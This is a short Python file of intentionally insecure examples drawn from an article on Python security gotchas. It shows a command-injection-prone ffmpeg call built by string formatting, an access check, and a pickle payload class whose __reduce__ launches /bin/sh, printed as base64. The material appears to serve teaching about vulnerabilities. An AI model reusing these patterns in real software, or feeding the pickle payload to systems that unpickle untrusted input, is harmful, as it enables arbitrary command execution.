# contains bunch of buggy examples
# taken from https://hackernoon.com/10-common-security-gotchas-in-python-and-how-to-avoid-them-e19fbe265e03
import base64
import pickle
import subprocess


# Input injection
def transcode_file(request, filename):
    command = 'ffmpeg -i "{source}" output_file.mpg'.format(source=filename)
    subprocess.call(command, shell=False)


# Assert statements
def foo(request, user):
    if not user.is_admin:
        raise Exception("user does not have access")
    # secure code...


# Pickles
class RunBinSh(object):
    def __reduce__(self):
        return (subprocess.Popen, (("/bin/sh",),))


print(base64.b64encode(pickle.dumps(RunBinSh())))
